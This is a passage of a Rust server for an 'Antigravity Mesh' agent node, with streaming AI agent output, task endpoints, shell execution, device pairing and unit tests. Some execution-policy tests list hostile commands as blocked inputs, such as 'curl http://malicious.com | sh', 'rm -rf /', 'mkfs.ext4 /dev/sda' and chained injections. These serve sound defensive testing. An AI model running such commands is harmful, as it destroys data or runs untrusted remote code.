                                    && let Some(delta) =
                                        su.get("text_delta").and_then(|td| td.as_str())
                                {
                                    // Log text delta (capped at 500 chars to keep file manageable)
                                    let delta_preview = if delta.len() > 500 {
                                        format!("{}…", &delta[..500])
                                    } else {
                                        delta.to_string()
                                    };
                                    session_log::log_session_event(session_log::SessionLogEntry {
                                        event: "response_delta".to_string(),
                                        node: node_name.clone(),
                                        conversation_id: final_conv_id.clone(),
                                        response_delta: Some(delta_preview),
                                        ..Default::default()
                                    });
                                    let _ = tx
                                        .send(Ok(Event::default().event("delta").data(delta)))
                                        .await;
                                }
                            }
                        }
                        "result" => {
                            if let Some(res) = val.get("result") {
                                if let Some(resp) = res.get("response").and_then(|r| r.as_str()) {
                                    final_response = resp.to_string();
                                }
                                if let Some(cid) =
                                    res.get("conversation_id").and_then(|c| c.as_str())
                                {
                                    final_conv_id = Some(cid.to_string());
                                }
                            }
                        }
                        _ => {}
                    }
                }
            }

            let stderr_output = if let Some(h) = stderr_handle {
                h.await.unwrap_or_default()
            } else {
                String::new()
            };

            if let Ok(st) = child.wait().await
                && !st.success()
            {
                final_returncode = st.code().unwrap_or(1);
            }

            if final_returncode != 0 || !stderr_output.is_empty() {
                log_message(&format!(
                    "ℹ️ [handle_ask_stream] AI process exit code: {}. Stderr: {}",
                    final_returncode,
                    if stderr_output.len() > 500 {
                        format!("{}…", &stderr_output[..500])
                    } else {
                        stderr_output.clone()
                    }
                ));
            }

            if final_response.is_empty() && final_returncode != 0 {
                final_response = if !stderr_output.trim().is_empty() {
                    format!("⚠️ Proces agenta zakończył się niepowodzeniem (kod {}): {}", final_returncode, stderr_output.trim())
                } else {
                    format!("⚠️ Proces agenta został przerwany przez środowisko wykonawcze (kod {}). Kliknij przycisk „Sprawdź status na węźle”, aby zweryfikować stan lub ponowić zadanie.", final_returncode)
                };
            }

            let payload_out = json!({
                "returncode": final_returncode,
                "stdout": final_response,
                "conversation_id": final_conv_id
            });
            let _ = tx
                .send(Ok(Event::default()
                    .event("result")
                    .data(payload_out.to_string())))
                .await;

            session_log::log_session_event(session_log::SessionLogEntry {
                event: "session_end".to_string(),
                node: node_name.clone(),
                conversation_id: final_conv_id.clone(),
                final_response: if final_response.is_empty() {
                    None
                } else {
                    Some(final_response)
                },
                status: Some(
                    if final_returncode == 0 { "ok" } else { "error" }.to_string(),
                ),
                returncode: Some(final_returncode),
                ..Default::default()
            });
        } else {
            let _ = child.wait().await;
            if let Some(h) = stderr_handle {
                let _ = h.await;
            }
        }
    });

    use tokio_stream::wrappers::ReceiverStream;
    Ok(Sse::new(ReceiverStream::new(rx)).keep_alive(
        KeepAlive::new()
            .interval(Duration::from_secs(15))
            .text("keep-alive"),
    ))
}

/// GET /sessions — returns the last 100 agent session events from the persistent JSONL log.
/// Used by the Android app and desktop dashboard to browse session history.
async fn handle_sessions(
    headers: HeaderMap,
    State(state): State<AppState>,
) -> Result<impl IntoResponse, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }
    let entries = session_log::read_recent_entries(100);
    let count = entries.len();
    let log_path = session_log::get_session_log_path()
        .to_string_lossy()
        .to_string();
    Ok(Json(json!({
        "entries": entries,
        "count": count,
        "log_path": log_path
    })))
}

// ============================================================================
// API v1 — Modern Asynchronous Platform & Capability Endpoints
// ============================================================================

async fn handle_api_v1_node(
    headers: HeaderMap,
    State(state): State<AppState>,
) -> Result<Json<NodeInfo>, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }
    let uptime = START_INSTANT
        .get()
        .map(|i| i.elapsed().as_secs())
        .unwrap_or(0);

    let platform = sysinfo::System::name().unwrap_or_else(|| std::env::consts::OS.to_string());
    let os_version = sysinfo::System::os_version().unwrap_or_default();
    let arch = std::env::consts::ARCH.to_string();

    #[cfg(target_os = "macos")]
    let has_gpu = true;
    #[cfg(not(target_os = "macos"))]
    let has_gpu = false;

    let capabilities = CapabilitySet {
        filesystem: true,
        process_exec: true,
        agent: state.agy_cli_path.is_some(),
        agent_stream: state.agy_cli_path.is_some(),
        gpu: has_gpu,
        tasks: true,
        multi_session: true,
    };

    let policy = *state.execution_policy.read().await;

    Ok(Json(NodeInfo {
        node_id: state.node_name.clone(),
        name: state.node_name.clone(),
        platform,
        os_version,
        arch,
        version: env!("CARGO_PKG_VERSION").to_string(),
        capabilities,
        execution_policy: policy,
        uptime_secs: uptime,
    }))
}

#[derive(Deserialize)]
struct SubmitTaskPayload {
    client_task_id: Option<String>,
    #[serde(default = "default_task_type")]
    task_type: TaskType,
    conversation_id: Option<String>,
    command: Option<String>,
    question: Option<String>,
    cwd: Option<String>,
    policy: Option<ExecutionPolicy>,
    #[serde(default)]
    auto_approve: bool,
}

fn default_task_type() -> TaskType {
    TaskType::AgentQuery
}

async fn handle_api_v1_tasks_submit(
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(payload): Json<SubmitTaskPayload>,
) -> Result<(StatusCode, Json<Task>), StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let policy = payload.policy.unwrap_or(*state.execution_policy.read().await);

    match state
        .task_engine
        .submit_task(
            payload.client_task_id,
            payload.task_type,
            payload.conversation_id,
            payload.command,
            payload.question,
            payload.cwd,
            Some(policy),
            payload.auto_approve,
        )
        .await
    {
        Ok(task) => Ok((StatusCode::CREATED, Json(task))),
        Err(err) => {
            log_message(&format!("❌ [handle_api_v1_tasks_submit] {}", err));
            Err(StatusCode::BAD_REQUEST)
        }
    }
}

#[derive(Deserialize)]
struct ListTasksQuery {
    limit: Option<usize>,
}

async fn handle_api_v1_tasks_list(
    headers: HeaderMap,
    Query(query): Query<ListTasksQuery>,
    State(state): State<AppState>,
) -> Result<Json<Vec<Task>>, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }
    let limit = query.limit.unwrap_or(50).min(200);
    match state.task_engine.list_tasks(limit).await {
        Ok(tasks) => Ok(Json(tasks)),
        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
    }
}

async fn handle_api_v1_tasks_get(
    headers: HeaderMap,
    axum::extract::Path(id): axum::extract::Path<String>,
    State(state): State<AppState>,
) -> Result<Json<Task>, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }
    match state.task_engine.get_task(&id).await {
        Ok(Some(task)) => Ok(Json(task)),
        Ok(None) => Err(StatusCode::NOT_FOUND),
        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
    }
}

#[derive(Deserialize)]
struct TaskLogsQuery {
    offset: Option<usize>,
}

async fn handle_api_v1_tasks_logs(
    headers: HeaderMap,
    axum::extract::Path(id): axum::extract::Path<String>,
    Query(query): Query<TaskLogsQuery>,
    State(state): State<AppState>,
) -> Result<Json<serde_json::Value>, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }
    let offset = query.offset.unwrap_or(0);
    match state.task_engine.get_task_logs(&id, offset).await {
        Ok((logs, next_offset)) => Ok(Json(json!({
            "task_id": id,
            "logs": logs,
            "next_offset": next_offset,
        }))),
        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
    }
}

async fn handle_api_v1_tasks_cancel(
    headers: HeaderMap,
    axum::extract::Path(id): axum::extract::Path<String>,
    State(state): State<AppState>,
) -> Result<StatusCode, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }
    match state.task_engine.cancel_task(&id).await {
        Ok(true) => Ok(StatusCode::OK),
        Ok(false) => Err(StatusCode::NOT_FOUND),
        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
    }
}

async fn handle_api_v1_sessions_list(
    headers: HeaderMap,
    State(state): State<AppState>,
) -> Result<Json<Vec<domain::ChatSessionMetadata>>, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }
    match state.task_engine.store().list_sessions() {
        Ok(sessions) => Ok(Json(sessions)),
        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
    }
}

async fn handle_api_v1_sessions_save(
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(session): Json<domain::ChatSessionMetadata>,
) -> Result<StatusCode, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }
    match state.task_engine.store().save_session(&session) {
        Ok(_) => Ok(StatusCode::OK),
        Err(_) => Err(StatusCode::INTERNAL_SERVER_ERROR),
    }
}

async fn run_shell_command(cmd: &str, dur: Duration) -> serde_json::Value {
    #[cfg(windows)]
    let mut process = {
        let mut c = Command::new("cmd");
        c.args(["/C", cmd]);
        c
    };

    #[cfg(not(windows))]
    let mut process = {
        let mut c = Command::new("sh");
        // Use login shell (-l) to load user's PATH from shell profile.
        // Critical when running from .app bundles or launchd where env is minimal.
        c.args(["-lc", cmd]);
        c
    };

    let work_dir = {
        let cwd = std::env::current_dir().unwrap_or_else(|_| get_user_home());
        if cwd == PathBuf::from("/") {
            get_user_home()
        } else {
            cwd
        }
    };
    process.current_dir(&work_dir);
    process.stdout(Stdio::piped()).stderr(Stdio::piped());

    match timeout(dur, process.output()).await {
        Ok(Ok(output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let returncode = output.status.code().unwrap_or(-1);
            json!({
                "returncode": returncode,
                "stdout": stdout,
                "stderr": stderr
            })
        }
        Ok(Err(e)) => json!({
            "error": format!("Process execution error: {}", e),
            "returncode": -1
        }),
        Err(_) => json!({
            "error": "Execution timed out",
            "returncode": -1
        }),
    }
}

#[derive(Deserialize)]
struct PairRequest {
    node_name: Option<String>,
    host: Option<String>,
    port: Option<u16>,
    token: String,
    pin: Option<String>,
}

#[cfg(target_os = "macos")]
fn show_native_confirm_dialog(name: &str, ip: &str) -> bool {
    let script = format!(
        r#"try
    set res to button returned of (display dialog "Urządzenie \"{}\" ({}) prosi o sparowanie z Antigravity Mesh.\n\nCzy zezwalasz na połączenie?" with title "Antigravity Mesh - Autoryzacja" buttons {{"Odrzuć", "Zezwól"}} default button "Zezwól" with icon note giving up after 25)
    return res
on error
    return "Timeout"
end try"#,
        name.replace('"', "\\\""),
        ip
    );
    let output = std::process::Command::new("osascript")
        .arg("-e")
        .arg(&script)
        .output();
    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout).trim().to_string();
        text == "Zezwól"
    } else {
        false
    }
}

#[cfg(target_os = "windows")]
fn show_native_confirm_dialog(name: &str, ip: &str) -> bool {
    use std::process::Command;
    let ps_script = format!(
        "$wshell = New-Object -ComObject Wscript.Shell; $res = $wshell.Popup('Urządzenie \"{}\" ({}) prosi o sparowanie z Antigravity Mesh.`n`nCzy zezwalasz na połączenie?', 25, 'Antigravity Mesh - Autoryzacja', 4 + 32); if ($res -eq 6) {{ exit 0 }} else {{ exit 1 }}",
        name.replace('\'', "''"),
        ip
    );
    let status = Command::new("powershell")
        .args(&["-NoProfile", "-Command", &ps_script])
        .status();
    match status {
        Ok(s) => s.success(),
        Err(_) => false,
    }
}

#[cfg(not(any(target_os = "macos", target_os = "windows")))]
fn show_native_confirm_dialog(name: &str, ip: &str) -> bool {
    use std::process::Command;
    let msg = format!("Urządzenie \"{}\" ({}) prosi o sparowanie z Antigravity Mesh.\n\nCzy zezwalasz na połączenie?", name, ip);
    if let Ok(status) = Command::new("zenity")
        .args(&["--question", "--title=Antigravity Mesh", "--text", &msg, "--timeout=25"])
        .status()
    {
        if status.success() {
            return true;
        }
    }
    if let Ok(status) = Command::new("kdialog")
        .args(&["--title", "Antigravity Mesh", "--yesno", &msg])
        .status()
    {
        if status.success() {
            return true;
        }
    }
    eprintln!("⚠️ [Pairing] No GUI dialog available for {} ({})", name, ip);
    false
}

async fn prompt_user_approval(remote_name: &str, remote_ip: &str) -> bool {
    let name = remote_name.to_string();
    let ip = remote_ip.to_string();
    tokio::task::spawn_blocking(move || {
        show_native_confirm_dialog(&name, &ip)
    })
    .await
    .unwrap_or(false)
}

async fn handle_pair(
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    State(state): State<AppState>,
    Json(payload): Json<PairRequest>,
) -> Result<impl IntoResponse, (StatusCode, Json<serde_json::Value>)> {
    log_message(&format!("🤝 [handle_pair] Pairing requested from {}", addr));
    if !is_private_ip(addr.ip()) {
        return Err((
            StatusCode::FORBIDDEN,
            Json(json!({"error": "Parowanie dozwolone wyłącznie z prywatnej sieci lokalnej (LAN / Tailscale)"})),
        ));
    }

    let remote_ip = addr.ip().to_string();
    let remote_host = payload.host.unwrap_or(remote_ip.clone());
    let remote_port = payload.port.unwrap_or(8888);
    let remote_name = payload
        .node_name
        .unwrap_or_else(|| format!("node-{}", remote_ip.replace('.', "-")));

    let expected_token = state.auth_token.read().await.clone();
    let expected_pin = state.pairing_pin.read().await.clone();

    let mut is_authorized = false;

    // 1. PIN or direct Token match
    if let Some(ref pin) = payload.pin {
        let clean_pin = pin.trim();
        if !clean_pin.is_empty() && (clean_pin == expected_pin || clean_pin == expected_token) {
            log_message(&format!("✅ [handle_pair] Device '{}' ({}) authorized via PIN/Token match", remote_name, remote_ip));
            is_authorized = true;
        }
    }

    // 2. Direct client token match if passed in token field
    if !is_authorized && !payload.token.trim().is_empty() && payload.token.trim() == expected_token {
        log_message(&format!("✅ [handle_pair] Device '{}' ({}) authorized via Token match", remote_name, remote_ip));
        is_authorized = true;
    }

    // 3. Check if device was previously paired and saved in mesh_nodes.json
    if !is_authorized && is_device_already_paired(&remote_name, &remote_ip, &payload.token) {
        log_message(&format!("✅ [handle_pair] Device '{}' ({}) recognized as already paired in mesh_nodes.json", remote_name, remote_ip));
        is_authorized = true;
    }

    // 4. Desktop confirmation prompt
    if !is_authorized {
        log_message(&format!("🔔 [handle_pair] Prompting user on desktop for approval of '{}' ({})", remote_name, remote_ip));
        let approved = prompt_user_approval(&remote_name, &remote_ip).await;
        if approved {
            log_message(&format!("✅ [handle_pair] Device '{}' ({}) approved by user on desktop", remote_name, remote_ip));
            is_authorized = true;
        } else {
            log_message(&format!("❌ [handle_pair] Device '{}' ({}) pairing rejected or timed out", remote_name, remote_ip));
        }
    }

    if !is_authorized {
        return Err((
            StatusCode::FORBIDDEN,
            Json(json!({
                "error": "Połączenie zostało odrzucone na komputerze lub minął limit czasu oczekiwania na akceptację (25s)"
            })),
        ));
    }

    save_paired_node(&remote_name, &remote_host, remote_port, &payload.token);

    let os_name = sysinfo::System::name().unwrap_or_else(|| std::env::consts::OS.to_string());

    Ok(Json(json!({
        "status": "paired",
        "node_name": state.node_name,
        "token": expected_token,
        "platform": os_name
    })))
}

#[cfg(test)]
mod mime_tests {
    use super::*;
    use crate::domain::TaskStatus;

    #[test]
    fn test_guess_mime_types() {
        assert_eq!(guess_mime_type("song.mp3"), "audio/mpeg");
        assert_eq!(guess_mime_type("audio.wav"), "audio/wav");
        assert_eq!(guess_mime_type("doc.pdf"), "application/pdf");
        assert_eq!(guess_mime_type("image.png"), "image/png");
        assert_eq!(guess_mime_type("photo.jpg"), "image/jpeg");
        assert_eq!(guess_mime_type("archive.zip"), "application/zip");
        assert_eq!(guess_mime_type("document.docx"), "application/vnd.openxmlformats-officedocument.wordprocessingml.document");
        assert_eq!(guess_mime_type("sheet.xlsx"), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet");
        assert_eq!(guess_mime_type("slides.pptx"), "application/vnd.openxmlformats-officedocument.presentationml.presentation");
        assert_eq!(guess_mime_type("video.mp4"), "video/mp4");
        assert_eq!(guess_mime_type("package.apk"), "application/vnd.android.package-archive");
        assert_eq!(guess_mime_type("unknown.bin"), "application/octet-stream");
    }

    #[tokio::test]
    async fn test_upload_serialization() {
        let resp = UploadResponse {
            success: true,
            path: Some("/tmp/test.txt".to_string()),
            bytes_written: 1234,
            error: None,
        };
        let json_str = serde_json::to_string(&resp).unwrap();
        assert!(json_str.contains("\"success\":true"));
        assert!(json_str.contains("\"bytes_written\":1234"));
        assert!(!json_str.contains("\"error\""));
    }

    #[tokio::test]
    async fn test_permission_audit_report_serialization() {
        let tmp_dir = std::env::temp_dir().join(format!("dummy_{}", uuid::Uuid::new_v4().simple()));
        let store = Arc::new(StateStore::open(&tmp_dir).expect("Open store"));
        let task_engine = Arc::new(TaskEngine::new(store, None));
        let dummy_state = AppState {
            auth_token: Arc::new(RwLock::new("test-token".to_string())),
            pairing_pin: Arc::new(RwLock::new("1234".to_string())),
            port: 8888,
            node_name: "TestNode".to_string(),
            agy_cli_path: None,
            update_offer: Arc::new(RwLock::new(None)),
            task_engine,
            execution_policy: Arc::new(RwLock::new(ExecutionPolicy::default())),
        };

        let report = run_permission_audit(&dummy_state).await;
        let json_str = serde_json::to_string(&report).expect("Serialization failed");
        assert!(json_str.contains("\"platform\":"));
        assert!(json_str.contains("\"accessibility\":"));
        assert!(json_str.contains("\"filesystem\":"));
        assert!(json_str.contains("\"codesign\":"));
        assert!(json_str.contains("\"process_execution\":"));
        assert!(json_str.contains("\"toolchains\":"));
        assert!(json_str.contains("\"network\":"));

        let deserialized: PermissionAuditReport = serde_json::from_str(&json_str).expect("Deserialization failed");
        assert_eq!(deserialized.platform, report.platform);
        assert_eq!(deserialized.network.listen_port, 8888);
    }

    #[test]
    fn test_dashboard_html_onclick_handlers_integrity() {
        let dashboard_html = include_str!("dashboard.html");
        
        // Include both dashboard.html and the update_banner HTML template
        let banner_html = r#"<button id="updateBtn" onclick="applyUpdate(this)">⚡ Aktualizuj teraz</button>"#;
        let combined_html = format!("{}\n{}", dashboard_html, banner_html);

        // Extract script content
        let script_start = dashboard_html.find("<script>").expect("Brak tagu <script> w dashboard.html");
        let script_end = dashboard_html.find("</script>").expect("Brak tagu </script> w dashboard.html");
        let script_content = &dashboard_html[script_start..script_end];

        let mut missing_handlers = Vec::new();
        // Skip the very first segment before the first onclick="
        let parts: Vec<&str> = combined_html.split("onclick=\"").collect();
        for part in &parts[1..] {
            if let Some(paren_idx) = part.find('(') {
                let candidate = part[..paren_idx].trim();
                let fn_name = candidate.split_whitespace().last().unwrap_or(candidate);
                if fn_name.is_empty()
                    || fn_name.starts_with("window")
                    || fn_name.starts_with("alert")
                    || fn_name.starts_with("console")
                {
                    continue;
                }

                if fn_name.chars().all(|c| c.is_alphanumeric() || c == '_') {
                    let has_definition = script_content.contains(&format!("function {}", fn_name))
                        || script_content.contains(&format!("async function {}", fn_name))
                        || script_content.contains(&format!("const {} =", fn_name))
                        || script_content.contains(&format!("let {} =", fn_name))
                        || script_content.contains(&format!("var {} =", fn_name));

                    if !has_definition {
                        missing_handlers.push(fn_name.to_string());
                    }
                }
            }
        }

        missing_handlers.sort();
        missing_handlers.dedup();

        assert!(
            missing_handlers.is_empty(),
            "Wykryto brakujące funkcje JavaScript dla atrybutów onclick w dashboard.html: {:?}",
            missing_handlers
        );
    }

    #[test]
    fn test_is_binary_content_detection() {
        assert!(is_binary_content("archive.zip", b"PK\x03\x04"));
        assert!(is_binary_content("program.exe", b"MZ"));
        assert!(is_binary_content("lib.dylib", b"\xca\xfe\xba\xbe"));
        assert!(is_binary_content(".DS_Store", b"\x00\x00\x00\x01"));
        assert!(is_binary_content("data.bin", b"hello\x00world"));
        
        // Pure UTF-8 text should NOT be binary
        assert!(!is_binary_content("README.md", b"# Antigravity Mesh\n\nTo jest dokumentacja."));
        assert!(!is_binary_content("main.rs", b"fn main() { println!(\"Hello\"); }\n"));
        assert!(!is_binary_content("config.json", b"{\"key\": \"warto\xc5\x9b\xc4\x87\"}"));
    }

    #[test]
    fn test_symlink_directory_resolution() {
        let temp = std::env::temp_dir().join(format!("mesh_test_{}", rand::random::<u32>()));
        let _ = std::fs::create_dir_all(&temp);

        let real_dir = temp.join("real_folder");
        let _ = std::fs::create_dir_all(&real_dir);
        let real_file = temp.join("real_file.txt");
        let _ = std::fs::write(&real_file, b"content");

        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            let sym_dir = temp.join("symlink_to_dir");
            let _ = symlink(&real_dir, &sym_dir);

            let sym_file = temp.join("symlink_to_file");
            let _ = symlink(&real_file, &sym_file);

            let walker = walkdir::WalkDir::new(&temp).max_depth(1).into_iter().filter_map(|e| e.ok());
            let mut checked_dir_symlink = false;
            let mut checked_file_symlink = false;

            for entry in walker {
                if entry.depth() == 0 { continue; }
                let name = entry.file_name().to_string_lossy().to_string();
                let is_symlink = entry.file_type().is_symlink();
                if name == "symlink_to_dir" {
                    assert!(is_symlink);
                    let target_meta = std::fs::metadata(entry.path()).expect("Should follow symlink to dir");
                    assert!(target_meta.is_dir());
                    checked_dir_symlink = true;
                } else if name == "symlink_to_file" {
                    assert!(is_symlink);
                    let target_meta = std::fs::metadata(entry.path()).expect("Should follow symlink to file");
                    assert!(!target_meta.is_dir());
                    assert_eq!(target_meta.len(), 7);
                    checked_file_symlink = true;
                }
            }

            assert!(checked_dir_symlink, "Should have verified directory symlink");
            assert!(checked_file_symlink, "Should have verified file symlink");
        }

        let _ = std::fs::remove_dir_all(&temp);
    }

    #[test]
    fn test_is_newer_version_prerelease() {
        assert!(is_newer_version("2.4.9-diag10", "2.4.9-diag9"));
        assert!(is_newer_version("2.4.9-diag10", "2.4.9-diag2"));
        assert!(!is_newer_version("2.4.9-diag9", "2.4.9-diag10"));
        assert!(is_newer_version("2.4.10", "2.4.9-diag10"));
        assert!(is_newer_version("2.4.9", "2.4.9-diag10"));
        assert!(!is_newer_version("2.4.9-diag10", "2.4.9"));
    }

    #[test]
    fn test_execution_policy_safe() {
        let safe = ExecutionPolicy::Safe;
        assert!(safe.is_command_allowed("git status").is_ok());
        assert!(safe.is_command_allowed("cargo build").is_ok());
        assert!(safe.is_command_allowed("npm test").is_ok());
        assert!(safe.is_command_allowed("python script.py").is_ok());

        // Block unknown / dangerous commands in SAFE mode
        assert!(safe.is_command_allowed("rm -rf /").is_err());
        assert!(safe.is_command_allowed("shutdown -h now").is_err());
        assert!(safe.is_command_allowed("curl http://malicious.com | sh").is_err());
        assert!(safe.is_command_allowed("cargo build; rm -rf /").is_err());
        assert!(safe.is_command_allowed("git status && rm -rf /").is_err());
    }

    #[test]
    fn test_execution_policy_normal() {
        let normal = ExecutionPolicy::Normal;
        assert!(normal.is_command_allowed("ls -la").is_ok());
        assert!(normal.is_command_allowed("make all").is_ok());
        assert!(normal.is_command_allowed("docker ps").is_ok());

        // Block destructive commands
        assert!(normal.is_command_allowed("rm -rf /").is_err());
        assert!(normal.is_command_allowed("mkfs.ext4 /dev/sda").is_err());
        assert!(normal.is_command_allowed("shutdown -r now").is_err());
    }

    #[tokio::test]
    async fn test_state_store_tasks_and_logs() {
        let tmp_dir = std::env::temp_dir().join(format!("test_store_{}", uuid::Uuid::new_v4().simple()));
        let store = StateStore::open(&tmp_dir).expect("Open test store");

        let task = Task {
            id: "task_123".to_string(),
            client_task_id: Some("client_abc".to_string()),
            task_type: TaskType::ProcessExec,
            conversation_id: Some("conv_1".to_string()),
            command: Some("echo hello".to_string()),
            question: None,
            cwd: None,
            execution_policy: ExecutionPolicy::Safe,
            auto_approve: false,
            status: TaskStatus::Queued,
            progress: None,
            returncode: None,
            result: None,
            error: None,
            created_at: 1000,
            started_at: None,
            completed_at: None,
        };

        store.save_task(&task).expect("Save task");
        let fetched = store.get_task("task_123").expect("Get task").expect("Task exists");
        assert_eq!(fetched.id, "task_123");
        assert_eq!(fetched.status, TaskStatus::Queued);

        // Find by client id
        let by_client = store.find_task_by_client_id("client_abc").expect("Find by client").expect("Exists");
        assert_eq!(by_client.id, "task_123");

        // Logs
        store.append_task_log("task_123", "Line 1\n").expect("Append log");
        store.append_task_log("task_123", "Line 2\n").expect("Append log");
        let logs = store.get_task_logs("task_123").expect("Get logs");
        assert_eq!(logs, "Line 1\nLine 2\n");

        let _ = std::fs::remove_file(&tmp_dir);
    }

    #[tokio::test]
    async fn test_task_engine_exec_lifecycle() {
        let tmp_dir = std::env::temp_dir().join(format!("test_engine_{}", uuid::Uuid::new_v4().simple()));
        let store = Arc::new(StateStore::open(&tmp_dir).expect("Open test store"));
        let engine = TaskEngine::new(store, None);

        let task = engine
            .submit_task(
                Some("client_unique_1".to_string()),
                TaskType::ProcessExec,
                None,
                Some("echo 'test output 123'".to_string()),
                None,
                None,
                Some(ExecutionPolicy::Normal),
                false,
            )
            .await
            .expect("Submit task");

        // Idempotency check: submitting same client_task_id returns existing task
        let dup = engine
            .submit_task(
                Some("client_unique_1".to_string()),
                TaskType::ProcessExec,
                None,
                Some("echo 'another'".to_string()),
                None,
                None,
                Some(ExecutionPolicy::Normal),
                false,
            )
            .await
            .expect("Submit duplicate");
        assert_eq!(dup.id, task.id);

        // Wait for task to complete (should be fast for simple echo)
        let mut completed = false;
        for _ in 0..50 {
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
            if let Ok(Some(t)) = engine.get_task(&task.id).await {
                if t.status == TaskStatus::Completed {
                    completed = true;
                    assert_eq!(t.returncode, Some(0));
                    break;
                }
            }
        }
        assert!(completed, "Task should have completed");

        let (logs, _) = engine.get_task_logs(&task.id, 0).await.expect("Get logs");
        assert!(logs.contains("test output 123"));

        let _ = std::fs::remove_file(&tmp_dir);
    }
}
